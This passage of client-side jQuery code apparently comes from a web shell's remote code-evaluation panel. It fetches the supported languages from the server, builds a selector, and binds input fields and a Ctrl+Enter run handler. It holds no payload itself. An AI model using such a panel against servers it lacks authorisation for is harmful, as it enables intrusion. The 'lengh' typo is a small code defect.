	else{
		send_post({evalGetSupported:"evalGetSupported"}, function(res){
			evalReady = true;
			if(res!="error"){
				localStorage.setItem('evalSupported', res);
				evalSupported = res;
				eval_bind();
				output("eval : "+evalSupported);
			}
		});
	}
}

function eval_bind(){
	if((evalSupported!=null)&&(evalSupported!='')){
		splits = evalSupported.split(",");
		$.each(splits, function(i, k){
			$('#evalType').append("<option>"+k+"</option>");
		});
	}
	$('#evalType').on('change', function(e){
		if($('#evalType').val()=='php'){
			$('#evalAdditional').hide();
		}
		else{
			$('#evalAdditional').show();
		}
	});
	$('#evalOptions').on('focus', function(e){
		options = $('#evalOptions');
		if(options.val()=='Options/Switches') options.val('');
	});
	$('#evalOptions').on('blur', function(e){
		options = $('#evalOptions');
		if($.trim(options.val())=='') options.val('Options/Switches');
	});
	$('#evalArguments').on('focus', function(e){
		args = $('#evalArguments');
		if(args.val()=='Arguments') args.val('');
	});
	$('#evalArguments').on('blur', function(e){
		args = $('#evalArguments');
		if($.trim(args.val())=='') args.val('Arguments');
	});

	var ei = $('#evalInput');
	ei.on('keydown', function(e){
		if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
			eval_go();
		}
		fix_tabchar(this, e);
	});
	var eval = localStorage.getItem('eval');
	if(eval) {
	    ei.val(eval);
    }
}

$.fn.setCursorPosition = function(position){
    if(this.lengh === 0) return this;
    return $(this).setSelection(position, position);
};

$.fn.setSelection = function(selectionStart, selectionEnd) {
    if(this.lengh === 0) return this;
    input = this[0];

    if (input.createTextRange) {
        var range = input.createTextRange();
        range.collapse(true);
        range.moveEnd('character', selectionEnd);
        range.moveStart('character', selectionStart);
        range.select();
    } else if (input.setSelectionRange) {
        input.focus();
        input.setSelectionRange(selectionStart, selectionEnd);
    }

    return this;
};

$.fn.focusEnd = function(){
    this.setCursorPosition(this.val().length);
};